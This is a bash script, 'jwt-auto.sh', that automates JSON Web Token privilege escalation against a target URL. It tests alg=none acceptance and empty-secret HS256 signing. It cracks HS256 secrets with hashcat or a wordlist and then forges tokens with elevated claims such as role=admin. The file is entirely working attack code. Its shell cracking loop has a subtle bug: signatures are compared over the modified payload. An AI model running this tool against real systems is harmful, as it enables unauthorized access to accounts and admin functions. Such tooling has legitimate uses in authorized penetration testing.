#!/usr/bin/env bash
set -euo pipefail

# jwt-auto.sh
# Tests common JWT misconfigs and automates privilege escalation token crafting:
# 1) alg=none acceptance
# 2) HS256 with empty secret
# 3) HS256 secret cracking via hashcat or wordlist, then claim escalation

# Dependencies: jq, curl, openssl
# Optional: hashcat (mode 16500)

usage() {
  cat <<'USAGE'
Usage:
  jwt-auto.sh -t JWT -u URL [--bearer | --cookie NAME] [--claim k=v ...]
              [--wordlist PATH] [--hashcat] [--expect-status N]
              [--expect-text "regex"] [--method GET|POST] [--data "body"]
              [--none-test] [--empty-secret-test] [--skip-crack] [-v]

Examples:
  jwt-auto.sh -t "$JWT" -u https://target/me --bearer --claim role=admin --none-test
  jwt-auto.sh -t "$JWT" -u https://target/admin --cookie session --empty-secret-test
  jwt-auto.sh -t "$JWT" -u https://target/admin --bearer --claim userType=Admin \
              --wordlist rockyou.txt --hashcat --expect-status 200

Notes:
  - --bearer sends "Authorization: Bearer <JWT>"
  - --cookie NAME sends "Cookie: NAME=<JWT>"
  - --claim can be repeated (e.g., --claim role=admin --claim userType=Admin)
  - --expect-status and/or --expect-text define success criteria
USAGE
  exit 1
}

# Defaults
METHOD="GET"
DATA=""
SEND_MODE=""   # bearer|cookie
COOKIE_NAME=""
EXPECT_STATUS=""
EXPECT_TEXT=""
DO_NONE=false
DO_EMPTY=false
DO_CRACK=true
USE_HASHCAT=false
VERBOSE=false

# Args
TOKEN=""
URL=""
CLAIMS=()
WORDLIST=""

while (( $# )); do
  case "$1" in
    -t|--token) TOKEN="$2"; shift 2 ;;
    -u|--url) URL="$2"; shift 2 ;;
    --bearer) SEND_MODE="bearer"; shift ;;
    --cookie) SEND_MODE="cookie"; COOKIE_NAME="${2:-}"; shift 2 ;;
    --claim) CLAIMS+=("$2"); shift 2 ;;
    --wordlist) WORDLIST="$2"; shift 2 ;;
    --hashcat) USE_HASHCAT=true; shift ;;
    --expect-status) EXPECT_STATUS="$2"; shift 2 ;;
    --expect-text) EXPECT_TEXT="$2"; shift 2 ;;
    --method) METHOD="$2"; shift 2 ;;
    --data) DATA="$2"; shift 2 ;;
    --none-test) DO_NONE=true; shift ;;
    --empty-secret-test) DO_EMPTY=true; shift ;;
    --skip-crack) DO_CRACK=false; shift ;;
    -v|--verbose) VERBOSE=true; shift ;;
    -h|--help) usage ;;
    *) echo "Unknown arg: $1" >&2; usage ;;
  esac
done

[[ -z "$TOKEN" || -z "$URL" || -z "$SEND_MODE" ]] && usage
if [[ "$SEND_MODE" == "cookie" && -z "$COOKIE_NAME" ]]; then
  echo "Cookie mode requires --cookie NAME" >&2; exit 1
fi

log() { $VERBOSE && echo "[*] $*" >&2 || true; }

# Base64url helpers
b64url_enc() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }
b64url_dec() { tr '-_' '+/' | base64 -d 2>/dev/null; }

hmac_b64url_sha256() {
  local key="$1"; local data="$2"
  printf '%s' "$data" | openssl dgst -binary -sha256 -hmac "$key" | b64url_enc
}

split_jwt() {
  IFS='.' read -r H P S <<< "$1" || true
  echo "$H" "$P" "$S"
}

decode_json() {
  printf '%s' "$1" | b64url_dec
}

encode_json() {
  printf '%s' "$1" | b64url_enc
}

send_with_token() {
  local jwt="$1"
  local hdrs=(-s -D -)
  [[ -n "$DATA" ]] && hdrs+=(-d "$DATA")
  hdrs+=(-X "$METHOD")
  if [[ "$SEND_MODE" == "bearer" ]]; then
    hdrs+=(-H "Authorization: Bearer $jwt")
  else
    hdrs+=(-H "Cookie: ${COOKIE_NAME}=${jwt}")
  fi

  # Capture headers+body
  local resp
  resp="$(curl "${hdrs[@]}" "$URL")"
  local status
  status="$(printf '%s' "$resp" | awk 'BEGIN{RS="\r\n\r\n"} NR==1{if (match($0,/HTTP\/[0-9.]+[[:space:]]+([0-9]{3})/,m)) print m[1]; exit}')"
  local body
  body="$(printf '%s' "$resp" | awk 'BEGIN{RS="\r\n\r\n"} NR>1{print $0}' | tail -n +2)"

  # Evaluate success
  local ok=true
  if [[ -n "$EXPECT_STATUS" ]]; then
    [[ "$status" == "$EXPECT_STATUS" ]] || ok=false
  fi
  if [[ -n "$EXPECT_TEXT" ]]; then
    printf '%s' "$body" | grep -Eiq "$EXPECT_TEXT" || ok=false
  fi

  echo "STATUS: $status"
  $VERBOSE && echo "BODY_SNIPPET: $(printf '%s' "$body" | head -c 300 | tr '\n' ' ')" >&2
  $ok && echo "RESULT: PASS" || echo "RESULT: FAIL"
  $ok
}

# Parse original token
read H_B64 P_B64 S_B64 < <(split_jwt "$TOKEN")
[[ -z "$H_B64" || -z "$P_B64" ]] && { echo "Invalid JWT"; exit 1; }

HDR_JSON="$(decode_json "$H_B64" || true)"
PL_JSON="$(decode_json "$P_B64" || true)"

ALG="$(printf '%s' "$HDR_JSON" | jq -r '.alg // empty')"
TYP="$(printf '%s' "$HDR_JSON" | jq -r '.typ // "JWT"')"

log "Header alg=$ALG typ=$TYP"
log "Original claims: $(printf '%s' "$PL_JSON" | jq -c '.')"

# Apply claim edits
if (( ${#CLAIMS[@]} > 0 )); then
  jq_expr='.'
  for kv in "${CLAIMS[@]}"; do
    k="${kv%%=*}"; v="${kv#*=}"
    # if v looks like number/true/false/null, use it raw; else string
    if [[ "$v" =~ ^-?[0-9]+$ || "$v" =~ ^(true|false|null)$ ]]; then
      jq_expr+=" | .\"$k\"=$v"
    else
      jq_expr+=" | .\"$k\"=\"${v//\"/\\\"}\""
    fi
  done
  PL_JSON="$(printf '%s' "$PL_JSON" | jq -c "$jq_expr")"
  P_B64="$(encode_json "$PL_JSON")"
  log "Modified claims: $(printf '%s' "$PL_JSON")"
fi

# Test 1: alg=none (header alg set to "none", empty signature)
if $DO_NONE; then
  H_NONE="$(jq -c --arg typ "$TYP" '{alg:"none",typ:$typ}' <<< "{}")"
  H_NONE_B64="$(encode_json "$H_NONE")"
  JWT_NONE="${H_NONE_B64}.${P_B64}."
  echo "=== Test: alg=none ==="
  send_with_token "$JWT_NONE" || true
fi

# Test 2: HS256 with empty secret
if $DO_EMPTY; then
  if [[ "$ALG" == "HS256" || -z "$ALG" ]]; then
    # Keep original header unless it declares RSA/EC
    H_USE="$HDR_JSON"
    if [[ "$ALG" != "HS256" ]]; then
      H_USE='{"alg":"HS256","typ":"JWT"}'
    fi
    H_USE_B64="$(encode_json "$H_USE")"
    SIGN_INPUT="${H_USE_B64}.${P_B64}"
    SIG_EMPTY="$(hmac_b64url_sha256 "" "$SIGN_INPUT")"
    JWT_EMPTY="${SIGN_INPUT}.${SIG_EMPTY}"
    echo "=== Test: HS256 with empty secret ==="
    send_with_token "$JWT_EMPTY" || true
  else
    echo "Skip empty-secret: alg=$ALG"
  fi
fi

FOUND_KEY=""
# Test 3: Crack HS256 secret then re-sign
if $DO_CRACK; then
  if [[ "$ALG" == "HS256" ]]; then
    echo "=== Crack HS256 secret ==="
    if $USE_HASHCAT; then
      [[ -z "$WORDLIST" ]] && { echo "Provide --wordlist for hashcat."; exit 1; }
      tmpdir="$(mktemp -d)"
      trap 'rm -rf "$tmpdir"' EXIT
      echo "$TOKEN" > "$tmpdir/jwt.txt"
      # Hashcat mode 16500 for JWT HS256; result prints as token:secret
      hashcat -a 0 -m 16500 "$tmpdir/jwt.txt" "$WORDLIST" --quiet --potfile-disable || true
      # Try reading cracked secret from potfile-less stdout cache
      cracked="$(hashcat -m 16500 "$tmpdir/jwt.txt" "$WORDLIST" --show --quiet --potfile-disable || true)"
      # If --show yields nothing, parse stdout from first run by re-running with --show
      if [[ -z "$cracked" ]]; then
        cracked="$(hashcat -m 16500 "$tmpdir/jwt.txt" "$WORDLIST" --show --quiet --potfile-disable || true)"
      fi
      if [[ "$cracked" == *:* ]]; then
        FOUND_KEY="${cracked#*:}"
        log "Cracked key (hashcat): $FOUND_KEY"
      else
        echo "Secret not found via hashcat (within given wordlist)."
      fi
    else
      [[ -z "$WORDLIST" ]] && { echo "Provide --wordlist or use --hashcat."; exit 1; }
      echo "Brute-forcing via openssl (slow)."
      SIGN_INPUT="${H_B64}.${P_B64}"
      IFS='.' read -r _ _ ORIG_SIG <<< "$TOKEN"
      ORIG_SIG="${S_B64}"
      while IFS= read -r cand; do
        sig="$(hmac_b64url_sha256 "$cand" "$SIGN_INPUT")"
        if [[ "$sig" == "$ORIG_SIG" ]]; then
          FOUND_KEY="$cand"; break
        fi
      done < "$WORDLIST"
      if [[ -n "$FOUND_KEY" ]]; then
        log "Cracked key (shell): $FOUND_KEY"
      else
        echo "Secret not found (wordlist exhausted)."
      fi
    fi

    # If key found, craft elevated token with modified claims
    if [[ -n "$FOUND_KEY" ]]; then
      H_USE_B64="$(encode_json "$HDR_JSON")"
      SIGN_INPUT="${H_USE_B64}.${P_B64}"
      NEW_SIG="$(hmac_b64url_sha256 "$FOUND_KEY" "$SIGN_INPUT")"
      JWT_NEW="${SIGN_INPUT}.${NEW_SIG}"
      echo "=== Test: HS256 re-signed with cracked secret ==="
      send_with_token "$JWT_NEW" || true
      echo "Cracked secret: $FOUND_KEY"
    fi
  else
    echo "Skip crack: alg=$ALG (not HS256)."
  fi
fi
